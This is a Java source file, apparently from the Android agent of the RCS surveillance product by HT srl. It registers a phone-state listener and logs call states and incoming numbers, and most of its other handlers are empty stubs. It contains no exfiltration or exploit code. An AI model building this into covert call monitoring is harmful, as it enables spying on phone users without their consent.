/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : PhoneListener.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent.call;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

// TODO: Auto-generated Javadoc
//SNIPPET
/**
 * The listener interface for receiving phone events.
 * The class that is interested in processing a phone
 * event implements this interface, and the object created
 * with that class is registered with a component using the
 * component's <code>addPhoneListener<code> method. When
 * the phone event occurs, that object's appropriate
 * method is invoked.
 *
 * @see PhoneEvent
 */
public class PhoneListener extends Activity {
	
	/** The tv1. */
	TextView tv1;
	
	/** The tel manager. */
	TelephonyManager telManager;

	/* (non-Javadoc)
	 * @see android.app.Activity#onCreate(android.os.Bundle)
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		telManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		telManager.listen(new TelListener(),
				PhoneStateListener.LISTEN_CALL_FORWARDING_INDICATOR
						| PhoneStateListener.LISTEN_CALL_STATE
						| PhoneStateListener.LISTEN_CELL_LOCATION
						| PhoneStateListener.LISTEN_DATA_ACTIVITY
						| PhoneStateListener.LISTEN_DATA_CONNECTION_STATE
						| PhoneStateListener.LISTEN_MESSAGE_WAITING_INDICATOR
						| PhoneStateListener.LISTEN_SERVICE_STATE
						| PhoneStateListener.LISTEN_SIGNAL_STRENGTH);
	}

	/**
	 * The listener interface for receiving tel events.
	 * The class that is interested in processing a tel
	 * event implements this interface, and the object created
	 * with that class is registered with a component using the
	 * component's <code>addTelListener<code> method. When
	 * the tel event occurs, that object's appropriate
	 * method is invoked.
	 *
	 * @see TelEvent
	 */
	private class TelListener extends PhoneStateListener {
		
		/* (non-Javadoc)
		 * @see android.telephony.PhoneStateListener#onCallStateChanged(int, java.lang.String)
		 */
		@Override
		public void onCallStateChanged(final int state,
				final String incomingNumber) {
			super.onCallStateChanged(state, incomingNumber);

			Log.v("Phone State", "state:" + state);
			switch (state) {

			case TelephonyManager.CALL_STATE_IDLE:
				Log.v("Phone State", "incomingNumber:" + incomingNumber
						+ " ended");
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK:
				Log.v("Phone State", "incomingNumber:" + incomingNumber
						+ " picked up");
				break;
			case TelephonyManager.CALL_STATE_RINGING:
				Log.v("Phone State", "incomingNumber:" + incomingNumber
						+ " received");
				break;
			default:
				break;
			}
		}

		/* (non-Javadoc)
		 * @see android.telephony.PhoneStateListener#onCallForwardingIndicatorChanged(boolean)
		 */
		@Override
		public void onCallForwardingIndicatorChanged(final boolean cfi) {
		};

		/* (non-Javadoc)
		 * @see android.telephony.PhoneStateListener#onCellLocationChanged(android.telephony.CellLocation)
		 */
		@Override
		public void onCellLocationChanged(final CellLocation location) {
		};

		/* (non-Javadoc)
		 * @see android.telephony.PhoneStateListener#onDataActivity(int)
		 */
		@Override
		public void onDataActivity(final int direction) {
		};

		/* (non-Javadoc)
		 * @see android.telephony.PhoneStateListener#onDataConnectionStateChanged(int)
		 */
		@Override
		public void onDataConnectionStateChanged(final int state) {
		};

		/* (non-Javadoc)
		 * @see android.telephony.PhoneStateListener#onMessageWaitingIndicatorChanged(boolean)
		 */
		@Override
		public void onMessageWaitingIndicatorChanged(final boolean mwi) {
		};

		/* (non-Javadoc)
		 * @see android.telephony.PhoneStateListener#onServiceStateChanged(android.telephony.ServiceState)
		 */
		@Override
		public void onServiceStateChanged(final ServiceState serviceState) {
		};

		/* (non-Javadoc)
		 * @see android.telephony.PhoneStateListener#onSignalStrengthChanged(int)
		 */
		@Override
		public void onSignalStrengthChanged(final int asu) {
		};
	}
}
